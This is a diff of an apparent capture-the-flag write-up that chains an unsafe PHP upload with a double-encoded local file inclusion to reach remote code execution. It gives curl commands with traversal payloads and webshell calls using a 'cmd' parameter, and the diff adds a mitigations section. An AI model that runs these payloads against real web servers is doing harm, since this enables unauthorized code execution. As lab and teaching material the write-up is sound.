@@ -24,12 +24,12 @@ First of all, I've found `/apply.php` page, where I can upload any type of file
 
 <img width="548" height="638" alt="13" src="https://github.com/user-attachments/assets/e58869a5-d8ee-42f8-805c-6a2ba8f17e2e" />
 
-Let's what's happened if we try to intercept request from vulnerable upload page
+Let's see what happens if we intercept the upload request from vulnerable upload page
 
 
 <img width="1146" height="566" alt="14" src="https://github.com/user-attachments/assets/7db5adbc-8afe-4ecf-b0c9-d83309579d60" />
 
-I didn't find any interest information after uploading the php file, but after uploading file we got to `/thanks.php` page
+I didn't find anything interesting after uploading the php file, but after uploading file we got to `/thanks.php` page
 
 
 <img width="1110" height="513" alt="15" src="https://github.com/user-attachments/assets/068b180e-789d-4548-8bcc-78813b4727cc" />
@@ -52,7 +52,7 @@ curl 'http://83.136.251.67:41528/api/image.php?p=....//....//....//....//....//.
 
 <img width="566" height="408" alt="2" src="https://github.com/user-attachments/assets/5d1090e5-dfb7-4028-9608-63dffd748242" />
 
-It looks like our payload worked properly.Let's move on
+The payload worked - Let's move on
 
 
 ## Exploitation(Initial Access)
@@ -96,6 +96,13 @@ header("Location: /thanks.php?n=" . urlencode($firstName));
 The page shows up how our upload works.
 `md5_file($tmp_name)` computes the MD5 hash of the uploaded file,then our file destination looks like `../uploads/<md5-hash>.php`
 
+
+Chain to RCE:
+1. Upload PHP webshell → server saves file as `../uploads/<md5>.php`.
+2. Predict `<md5>` by hashing the local shell file.
+3. Use double-encoded traversal in `contact.php?region=...` to include `../uploads/<md5>.php`.
+4. The include executes the uploaded PHP shell, allowing arbitrary `cmd` parameter execution.
+
 After, I checked the `/contact.php` page
 
 <img width="697" height="396" alt="18" src="https://github.com/user-attachments/assets/340268fd-dcc0-4126-94e2-1f3c8a9fe0a8" />
@@ -116,6 +123,10 @@ First, let's try to compute MD5 hash of our file `shell.php`
 md5sum shell.php | cut -d ' ' -f1
 c214a2fb80bab315fc328a5eff2892b5
 ```
+The uploaded file will be located at:
+```text
+/uploads/c214a2fb80bab315fc328a5eff2892b5.php
+```
 
 Now we can exploit `/contact.php` page with LFI to get RCE:
 ```bash
@@ -126,7 +137,7 @@ curl "http://83.136.251.67:41528/contact.php?region=%252e%252e%252fuploads%252fc
 
 ## Obtain the flag
 
-I moved to the `/` directory to this what's our flag file name
+I moved to the `root` directory to this what's our flag file name
 
 ```bash
 curl "http://83.136.251.67:41528/contact.php?region=%252e%252e%252fuploads%252fc214a2fb80bab315fc328a5eff2892b5&cmd=ls%20/"
@@ -139,4 +150,17 @@ Our flag was successfully found!
 <img width="1126" height="475" alt="8" src="https://github.com/user-attachments/assets/113c822c-b184-426f-ae8b-a40958f220f6" />
 
 
+
+
+## Mitigations and recommendations
+
+- **Whitelist allowed values** for `region` (e.g. `in_array($region, [‘eu’,’us’,’asia’])`) — never include arbitrary user input.
+- **Validate after decoding.** If you must decode input, validate the decoded value, not the raw `$_GET`.
+- **Disable PHP execution in upload directories.** Store uploads outside the webroot or configure the uploads directory with `php_admin_flag engine Off` / `Options -ExecCGI`.
+- **Do not rely on client-supplied extensions.** Validate content type with `finfo_file()` or use image-specific checks like `getimagesize()` for images.
+- **Avoid using `str_replace(“../“, “”, $input)`** — use canonicalization and a whitelist-based approach instead.
+
+
+## Conclusion 
+Conclusion: This assessment demonstrates how a combination of a naive file include and unsafe upload handling results in full remote code execution. Simple mitigations — whitelist-driven includes, validating decoded input, and disabling PHP execution in upload directories — would have prevented this compromise.
 
